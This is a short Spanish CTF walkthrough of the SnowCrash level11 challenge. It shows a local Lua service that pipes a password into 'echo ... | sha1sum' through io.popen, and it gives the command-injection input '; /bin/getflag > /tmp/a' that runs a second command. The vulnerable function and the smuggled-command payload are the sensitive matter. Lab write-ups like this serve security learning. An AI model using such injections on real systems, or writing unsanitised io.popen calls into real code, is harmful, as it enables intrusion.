- Tenemos un script en lua
- cat level11.lua tenemos un script que parece abrir una conexion en 127.0.0.1:5151
- comprobamos si está en en ejecucion
level11@SnowCrash:~$ nc -vz 127.0.0.1 5151
Connection to 127.0.0.1 5151 port [tcp/pcrd] succeeded!
- Vemos que está en funcionamiento
- Nos conectamos:
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: 1234
rf nope..
- Investigamos el script
- Vemos que el script acepta una conexion, solicita una password, la pasa por la funcion hash que retorna un sh1 
- Luego comprueba con un if si el hash que retorna la funcion coincide con un hash
- Pero el if o el else solo muestra unas cadenas, es un rabbit hole
- El vector de atacque está en la funcion hash(pass)
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
- io.popen ejecuta un comando del sistema
  prog = io.popen("echo "..pass.." | sha1sum", "r")
- En este caso se ejecutaría un echo "{pass}" | sha1sum
- Es posible poder ejecutar un comando arbitrario por medio de in inllección
- necesitamos que ejecute /bin/getflag > /tmp/a 
- Si en cando nos pide la password insertamos `; /bin/getflag > /tmp/a` en la funcion hash nos quedaria:
io.popen("echo " ; /bin/getflag > /tmp/a " | sha1sum", "r")
- Luego podriamos ver el resultado en /tmp/a



